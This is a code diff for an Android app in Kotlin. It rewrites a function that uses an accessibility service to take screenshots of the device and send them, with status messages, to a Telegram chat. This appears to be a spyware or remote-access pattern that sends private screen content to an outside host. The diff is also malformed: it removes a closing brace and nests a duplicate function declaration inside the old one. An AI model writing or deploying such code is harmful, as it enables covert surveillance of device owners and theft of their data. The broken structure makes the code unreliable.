@@ -178,63 +178,58 @@ private suspend fun takeScreenshot() {
     if (accService == null || !accService.isConnected) {
         sendTelegramMessage("⚠️ Accessibility service not enabled. Please enable 'MyApp' in Accessibility settings.")
         return
-    }
 
-    if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
-        sendTelegramMessage("❌ Screenshot via AccessibilityService requires Android 11 (API 30) or higher.")
+
+private suspend fun takeScreenshot() {
+    val accService = MyAccessibilityService.instance
+    if (accService == null || !accService.isConnected) {
+        sendTelegramMessage("⚠️ Accessibility service not running. Enable it in Settings > Accessibility > MyApp")
         return
     }
-
-    val bitmap = kotlinx.coroutines.suspendCancellableCoroutine<android.graphics.Bitmap?> { cont ->
+    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+        sendTelegramMessage("❌ Screenshot requires Android 11+")
+        return
+    }
+    val bitmap = suspendCancellableCoroutine<Bitmap?> { cont ->
         accService.takeScreenshot(
-            android.view.Display.DEFAULT_DISPLAY,
+            Display.DEFAULT_DISPLAY,
             accService.mainExecutor,
-            object : android.accessibilityservice.AccessibilityService.TakeScreenshotCallback {
-                override fun onSuccess(screenshot: android.accessibilityservice.AccessibilityService.ScreenshotResult) {
+            object : AccessibilityService.TakeScreenshotCallback {
+                override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
                     try {
                         val buffer = screenshot.hardwareBuffer
-                        val bmp = android.graphics.Bitmap.wrapHardwareBuffer(
-                            buffer,
-                            screenshot.colorSpace
-                        )?.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
+                        val bmp = Bitmap.wrapHardwareBuffer(buffer, screenshot.colorSpace)
+                            ?.copy(Bitmap.Config.ARGB_8888, false)
                         buffer.close()
                         if (cont.isActive) cont.resume(bmp)
                     } catch (e: Exception) {
-                        e.printStackTrace()
                         if (cont.isActive) cont.resume(null)
                     }
                 }
-
                 override fun onFailure(errorCode: Int) {
                     if (cont.isActive) cont.resume(null)
                 }
             }
         )
     }
-
     if (bitmap == null) {
-        sendTelegramMessage("❌ Failed to capture screenshot.")
+        sendTelegramMessage("❌ Screenshot failed (possible overlay or locked screen)")
         return
     }
-
-    val file = java.io.File(cacheDir, "ss_${System.currentTimeMillis()}.jpg")
+    val file = File(cacheDir, "ss_${System.currentTimeMillis()}.jpg")
     try {
-        java.io.FileOutputStream(file).use { out ->
-            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, out)
+        FileOutputStream(file).use { out ->
+            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, out)
         }
         sendTelegramPhoto(file)
-        sendTelegramMessage("📸 Screenshot taken and sent.")
+        sendTelegramMessage("📸 Screenshot sent")
     } catch (e: Exception) {
-        sendTelegramMessage("❌ Error: ${e.message}")
+        sendTelegramMessage("❌ Save error: ${e.message}")
     } finally {
         bitmap.recycle()
-        if (file.exists()) {
-            file.delete()
-        }
+        file.delete()
     }
 }
-
-
 
 
 
